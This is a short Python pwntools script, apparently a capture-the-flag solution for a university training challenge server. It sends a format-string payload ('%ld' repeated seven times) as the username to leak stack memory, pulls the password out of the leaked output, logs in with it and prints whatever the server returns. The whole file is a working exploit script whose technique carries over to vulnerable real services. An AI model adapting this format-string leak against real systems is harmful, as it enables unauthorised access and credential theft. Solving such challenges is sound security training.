from pwn import *

r = remote("cyberchallenge.disi.unitn.it", 9004)

r.sendlineafter(
    b"username: ",
    b"%ld " * 7
)

password = r.recvline().strip().split(b" ")[-1]

log.info(f"Password: {password.decode()}")

r.sendlineafter(
    b"Password: ",
    password
)

print(r.recvall().decode(errors="ignore"))